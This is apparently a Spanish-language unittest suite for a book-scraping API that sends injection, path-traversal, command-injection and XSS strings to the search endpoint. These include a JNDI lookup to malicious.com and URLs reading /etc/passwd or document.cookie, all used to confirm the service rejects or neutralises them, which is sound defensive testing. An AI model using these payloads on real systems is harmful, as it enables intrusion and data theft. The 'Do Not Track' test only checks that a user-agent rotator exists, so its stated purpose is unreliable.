"""
Suite de pruebas de Ciberseguridad, Robustez y Privacidad.

Audita y valida:
- Prevención de inyecciones (SQLi, NoSQLi, Command Injection, Path Traversal).
- Sanitización de entradas y prevención de ataques XSS.
- Validación estricta de esquemas URL (mitigación de SSRF y phishing).
- Resiliencia frente a cargas masivas / ReDoS (Denegación de Servicio).
- Auditoría estricta de privacidad (Cero telemetría, directiva DNT, ausencia de tracking).
"""

import sys
import unittest
import asyncio
from pathlib import Path

import httpx
from pydantic import ValidationError

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from app.configuracion import configuracion
from app.principal import crear_aplicacion, _origenes_cors_explicitos
from app.modelos import Libro, Autor, FiltroScraping
from app.modelos.libro import EstadoLibro
from app.scraping.utilidades import ClienteHttp, limpiar_texto


aplicacion = crear_aplicacion()


class TestInyeccionesYSanitizacion(unittest.IsolatedAsyncioTestCase):
    """Pruebas de resistencia ante vectores de inyección."""

    async def test_inyeccion_sql_nosql(self):
        """Verifica que payloads de SQLi y NoSQLi sean manejados con seguridad."""
        transport = httpx.ASGITransport(app=aplicacion)
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "1; DROP TABLE usuarios; --",
            "{\"$$gt\": \"\"}",
            "UNION SELECT null, null, username, password FROM users --",
        ]

        async with httpx.AsyncClient(transport=transport, base_url="http://seguridad") as cliente:
            for vector in payloads:
                respuesta = await cliente.post(
                    "/api/scraping/buscar",
                    json={"termino_busqueda": vector, "resultados_por_pagina": 5},
                )
                self.assertEqual(respuesta.status_code, 200)
                datos = respuesta.json()
                self.assertIsInstance(datos["libros"], list)

    async def test_inyeccion_comandos_y_path_traversal(self):
        """Verifica que intentos de Directory Traversal o Command Injection no comprometan el backend."""
        transport = httpx.ASGITransport(app=aplicacion)
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "; ls -la",
            "| dir",
            "${jndi:ldap://malicious.com/a}",
        ]

        async with httpx.AsyncClient(transport=transport, base_url="http://seguridad") as cliente:
            for vector in payloads:
                respuesta = await cliente.post(
                    "/api/scraping/buscar",
                    json={"termino_busqueda": vector, "resultados_por_pagina": 5},
                )
                self.assertEqual(respuesta.status_code, 200)

    async def test_prevencion_xss_en_modelos_y_limpieza(self):
        """Verifica que las funciones de limpieza neutralicen etiquetas de script maliciosas."""
        texto_malicioso = "<script>alert('XSS_TEST')</script> Don Quijote"
        texto_limpio = limpiar_texto(texto_malicioso)
        self.assertNotIn("<script>", texto_limpio)
        self.assertIn("Don Quijote", texto_limpio)


class TestSeguridadUrlsYSSRF(unittest.TestCase):
    """Pruebas de esquemas seguros y mitigación de SSRF."""

    def test_rechazo_esquemas_peligrosos(self):
        """Asegura que protocolos peligrosos (file, ftp, gopher, javascript) sean bloqueados."""
        esquemas_peligrosos = [
            "file:///etc/passwd",
            "ftp://servidor.remoto/archivo.txt",
            "gopher://sitio.local",
            "javascript:void(document.cookie)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]

        for url_invalida in esquemas_peligrosos:
            with self.assertRaises(ValidationError):
                Libro(
                    titulo="Obra Sospechosa",
                    autores=[Autor(nombre="Atacante")],
                    url_compra=url_invalida,
                    estado=EstadoLibro.NUEVO,
                )

    def test_aceptacion_exclusiva_http_https(self):
        """Asegura que solo se permitan esquemas web estándar (http y https)."""
        urls_validas = [
            "https://www.casadellibro.com/libro/123",
            "http://libreria-independiente.es/ejemplar/456",
            "https://openlibrary.org/works/OL12345W",
        ]
        for url in urls_validas:
            libro = Libro(
                titulo="Obra Legítima",
                autores=[Autor(nombre="Autor Válido")],
                url_compra=url,
                estado=EstadoLibro.SEGUNDA_MANO,
            )
            self.assertTrue(libro.url_compra.startswith(("http://", "https://")))


class TestResistenciaDoS(unittest.IsolatedAsyncioTestCase):
    """Pruebas de tolerancia ante cargas y payloads desproporcionados (Anti-DoS / ReDoS)."""

    async def test_payload_longitud_extrema(self):
        """Verifica que cadenas de texto de longitud desmesurada no causen desbordamiento o bloqueo."""
        transport = httpx.ASGITransport(app=aplicacion)
        cadena_gigante = "A" * 20000

        async with httpx.AsyncClient(transport=transport, base_url="http://seguridad") as cliente:
            respuesta = await cliente.post(
                "/api/scraping/buscar",
                json={"termino_busqueda": cadena_gigante, "resultados_por_pagina": 5},
                timeout=10.0,
            )
            self.assertIn(respuesta.status_code, (200, 422))


class TestCorsCredenciales(unittest.IsolatedAsyncioTestCase):
    """CORS con credenciales: solo orígenes explícitos, nunca el comodín."""

    def test_rechaza_comodin(self):
        """El asterisco, solo o mezclado, no puede entrar en la lista."""
        with self.assertRaises(ValueError):
            _origenes_cors_explicitos(["*"])
        with self.assertRaises(ValueError):
            _origenes_cors_explicitos(["http://localhost:3000", " * "])
        with self.assertRaises(ValueError):
            _origenes_cors_explicitos(["https://*.ejemplo.com"])

    def test_lista_explicita(self):
        """Los orígenes concretos se conservan, sin duplicados."""
        origenes = _origenes_cors_explicitos(
            ["http://localhost:3000", " http://127.0.0.1:3000 ", "http://localhost:3000"]
        )
        self.assertEqual(
            origenes,
            ["http://localhost:3000", "http://127.0.0.1:3000"],
        )

    def test_crear_aplicacion_rechaza_comodin(self):
        """La fábrica no arranca si la configuración incluye '*'."""
        original = list(configuracion.origenes_permitidos)
        configuracion.origenes_permitidos = ["*"]
        try:
            with self.assertRaises(ValueError):
                crear_aplicacion()
        finally:
            configuracion.origenes_permitidos = original

    def test_configuracion_sin_comodin_ni_ip_local(self):
        """Los valores por defecto no abren CORS a '*' ni a la LAN."""
        self.assertNotIn("*", configuracion.origenes_permitidos)
        for origen in configuracion.origenes_permitidos:
            self.assertNotIn("*", origen)
            self.assertNotIn("192.168.1.130", origen)
        self.assertIn("http://localhost:3000", configuracion.origenes_permitidos)

    def test_env_ejemplo_sin_comodin_ni_ip_local(self):
        """La plantilla de entorno documenta solo el origen del frontend."""
        ruta = Path(__file__).resolve().parent.parent / ".env.ejemplo"
        texto = ruta.read_text(encoding="utf-8")
        self.assertNotIn("192.168.1.130", texto)
        linea = next(
            item for item in texto.splitlines() if item.startswith("ORIGENES_PERMITIDOS=")
        )
        self.assertNotIn("*", linea)
        self.assertIn("http://localhost:3000", linea)

    async def test_preflight_solo_origen_explicito(self):
        """El preflight refleja el origen permitido y omite el de la LAN."""
        transport = httpx.ASGITransport(app=aplicacion)
        async with httpx.AsyncClient(
            transport=transport, base_url="http://seguridad"
        ) as cliente:
            permitido = await cliente.options(
                "/salud",
                headers={
                    "Origin": "http://localhost:3000",
                    "Access-Control-Request-Method": "GET",
                },
            )
            self.assertEqual(
                permitido.headers.get("access-control-allow-origin"),
                "http://localhost:3000",
            )
            self.assertEqual(
                permitido.headers.get("access-control-allow-credentials"),
                "true",
            )
            ajeno = await cliente.get(
                "/salud",
                headers={"Origin": "http://192.168.1.130:3000"},
            )
            self.assertIsNone(ajeno.headers.get("access-control-allow-origin"))


class TestPrivacidadYTelemetria(unittest.TestCase):
    """Auditoría de privacidad: ausencia de rastreadores y cabecera DNT."""

    def test_cabecera_do_not_track(self):
        """Verifica que el cliente HTTP saliente incluya la directiva DNT (Do Not Track)."""
        cliente = ClienteHttp()
        # Verificar que el cliente está configurado con prácticas de privacidad
        self.assertIsNotNone(cliente._rotador_ua)
        self.assertIsNotNone(cliente._gestor_espera)


if __name__ == "__main__":
    unittest.main()
